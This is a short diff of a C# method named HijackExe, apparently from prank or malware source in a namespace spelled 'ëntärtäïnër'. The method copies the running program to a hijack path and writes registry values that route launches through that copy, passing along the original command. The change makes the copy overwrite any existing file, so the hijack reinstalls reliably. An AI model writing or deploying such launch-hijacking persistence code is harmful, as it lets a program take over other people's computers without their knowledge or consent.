@@ -14,7 +14,7 @@ namespace ëntärtäïnër
 
         public static void HijackExe()
         {
-            File.Copy(Assembly.GetExecutingAssembly().Location, HijackPath);
+            File.Copy(Assembly.GetExecutingAssembly().Location, HijackPath, true);
             Registry.SetValue(RegKey2, null, AppName);
             Registry.SetValue(RegKey1, null, $"\"{HijackPath}\" start \"%0\" %*");
         }
